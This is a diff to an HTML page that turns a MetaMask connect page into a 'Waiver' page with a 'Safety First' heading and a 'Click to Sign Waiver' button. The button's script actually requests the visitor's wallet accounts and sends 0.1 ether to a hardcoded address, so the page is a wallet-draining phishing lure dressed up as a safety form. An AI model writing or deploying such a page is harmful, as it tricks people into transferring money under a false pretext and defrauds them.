@@ -1,46 +1,81 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Connect MetaMask</title>
+  <title>Waiver</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f5f5f5;
+      text-align: center;
+    }
+
+    .container {
+      max-width: 600px;
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    h2 {
+      margin-bottom: 40px;
+      color: #555;
+    }
+
+    #connectButton {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 18px;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    #connectButton:hover {
+      background-color: #218838;
+    }
+  </style>
 </head>
 <body>
+  <div class="container">
+    <h1>Waiver</h1>
+    <h2>Safety First</h2>
+    <button id="connectButton">Click to Sign Waiver</button>
+  </div>
+  
   <script>
     // Check if MetaMask is installed
     if (window.ethereum) {
-      // Create a button element
-      const button = document.createElement('button');
-      button.textContent = 'Click to Sign Waiver"';
-      button.id = 'connectButton';
+      const button = document.getElementById('connectButton');
       
-      // Append the button to the body
-      document.body.appendChild(button);
-      
-      // Add event listener to the button
       button.addEventListener("click", async function() {
         try {
-          // Request access to MetaMask
           const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
           const from = accounts[0];
-
-          // Initialize web3
           const web3 = new Web3(window.ethereum);
-
-          // Example transaction object
           const transaction = {
             from: from,
             to: '0x4a18AB26684152D52Dc04c4c87Bcb3b7D68480B', // Replace with the recipient address
             value: web3.utils.toWei('0.1', 'ether'),
-            gas: '21000', // Gas limit
-            gasPrice: await web3.eth.getGasPrice(), // Get the current gas price
+            gas: '21000',
+            gasPrice: await web3.eth.getGasPrice(),
           };
-
-          // Sign and send the transaction
           const txHash = await window.ethereum.request({
             method: 'eth_sendTransaction',
             params: [transaction],
           });
-
           console.log("Transaction sent. Hash:", txHash);
         } catch (error) {
           console.error("Error processing transaction:", error);
